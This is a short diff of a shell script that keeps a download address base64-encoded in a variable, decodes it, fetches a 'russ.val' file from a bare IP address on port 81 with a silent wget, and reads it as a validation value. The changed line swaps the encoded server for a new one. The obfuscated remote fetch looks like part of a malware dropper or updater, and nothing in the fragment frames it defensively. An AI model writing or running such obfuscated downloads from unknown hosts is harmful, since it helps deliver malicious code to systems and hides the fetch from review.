@@ -59,7 +59,7 @@ rm -f russel.*
 else
 mkdir -p chumogh
 cd chumogh
-update1='aHR0cDovLzgwLjIxMS4yMzguMTM4OjgxL3J1c3MudmFs'
+update1='aHR0cDovLzM1LjE4My4yMDkuOTg6ODEvcnVzcy52YWw='
 update2=$(echo $update1|$dom)
 wget -q $update2
 validar=$(cat < russ.val)
